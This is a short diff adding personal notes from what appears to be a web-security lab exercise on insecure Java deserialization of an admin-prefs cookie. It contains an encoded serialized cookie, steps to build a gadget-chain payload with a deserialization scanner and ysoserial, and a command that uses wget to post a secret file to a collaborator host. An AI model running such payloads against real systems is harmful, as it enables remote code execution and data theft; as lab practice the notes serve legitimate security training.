@@ -56,3 +56,18 @@ File upload => non
 
 View-source => clean
 
+exfiltration:
+
+Insecure deserialization of admin-prefs cookie
+
+H4sIAAAAAAAA%2fzWPPU7DQBCFF0RSQcMJpkOi2PTQEH4iCkcKClJEOV6Pk8HrHbO7dmKQOA4VJ%2bAI3IU7sBahm%2fn09PS9zx81Cl6dW8w1msjigjZS1%2bJ0IM9o%2bRVzS3pa1OwWnsrw9vUxDqvv7FAdZeq4xE48R5qJFFGdZs%2fY4cSiW0%2bW0bNbX2bq5D%2fz0EqkF%2fWuDvawHei1SLWHo7ih%2bi%2bxa6Iab5kc%2baiu5j04rAk4wA16KwHm4qL0qOFJWqjYWiqg7qHEVOE1JNMGPUEUKJh0VIvHDcGKcpg2jWWDw1K4R1ORPwvpcEWePC7gloORjgZ1SBDudo0VjsO7JDMI9zCzuA1JT3zaSb9PDWuHQgEAAA%3d%3d
+
+extension Java deserialisation scanner => exploitation 
+
+Compress using gzip + Encode using Base64 + Encode using URL encoding
+
+Payload: CommonsCollections7 'wget https://your.burp.oastify.com --post-file=/home/carlos/secret'
+
+Received request data => solution-NMN8OGrvOL0ehJ5wqoNWIGTWPwaTZZ8Z
+
+/!\ Configure the path to the ysoserial.jar file in the extension config and use another version of ysoserial if that doesn't work.
